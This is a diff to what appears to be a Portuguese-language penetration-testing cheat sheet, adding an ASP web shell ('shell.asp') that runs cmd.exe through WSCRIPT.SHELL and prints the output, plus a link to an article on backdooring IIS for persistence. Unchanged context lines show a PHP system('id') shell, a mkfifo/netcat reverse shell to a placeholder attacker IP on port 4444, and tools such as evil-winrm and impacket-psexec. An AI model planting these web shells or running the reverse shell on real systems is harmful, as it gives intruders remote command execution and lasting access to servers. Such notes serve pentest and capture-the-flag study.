@@ -118,7 +118,17 @@ PAGINA CONTENDO [OUTROS](https://ygoralberto.github.io/outros) COMANDOS DE WINDO
 .
 
 	<?php system('id');?>
-	
+
+.
+
+ 	SHELL EM ASP (shell.asp)
+	<%
+	Set oS = Server.CreateObject("WSCRIPT.SHELL")
+	Set objCmdExec = oS.exec("cmd.exe /c ipconfig")
+	getCommandOutput = objCmdExec.StdOut.ReadAll
+	Response.Write getCommandOutput
+	%>
+
 .
 
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <your_IP> 4444 >/tmp/f
@@ -5816,6 +5826,9 @@ Comando para uma shell interativa: echo 0 > /proc/sys/vm/dirty_writeback_centise
 Ferramenta de shell interativa web `WEEVELY`
 
 Ferramenta para shell interativa no windows `evil-winrm -i IP -u USER -p PASS` alternativa ao xfreerdp e rdesktop, também o `wmiexec` o `impacket-psexec` e `remmina`
+
+[Shell em asp shell.asp](https://medium.com/@viniciuskmax/backdoorando-o-iis-como-usar-uma-webshell-para-obter-persist%C3%AAncia-de-acesso-system-a-um-servidor-9180a20a1a49)
+
 
 - INFORMATION GATHERING
 
